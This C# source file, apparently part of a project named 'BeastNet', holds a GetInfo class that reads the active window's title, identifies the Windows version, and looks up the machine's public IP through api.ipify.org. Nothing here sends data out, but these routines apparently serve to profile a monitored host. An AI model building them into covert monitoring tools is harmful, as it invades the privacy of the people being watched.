using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;

namespace BeastNet
{
    class GetInfo
    {
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        public static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }

        public static string GetOSVersion()
        {
            int major = Environment.OSVersion.Version.Major;
            int minor = Environment.OSVersion.Version.Minor;
            string param = "";
            switch (major)
            {
                case 10:
                    param = "10";
                    break;
                case 6:
                    switch (minor)
                    {
                        case 3:
                            param = "8.1";
                            break;
                        case 2:
                            param = "8";
                            break;
                        case 1:
                            param = "7";
                            break;
                        case 0:
                            param = "Vista";
                            break;
                    }
                    break;
                case 5:
                    switch(minor)
                    {
                        case 2:
                            param = "XP 64bit";
                            break;
                        case 1:
                            param = "XP";
                            break;
                        case 0:
                            param = "2000";
                            break;
                    }
                    break;
                default:
                    param = "";
                    break;
            }
            return "Windows " + param;
        }

        public static string GetIP()
        {
            WebClient client = new WebClient();
            string ip = client.DownloadString("https://api.ipify.org");
            return ip;
        }
    }
}
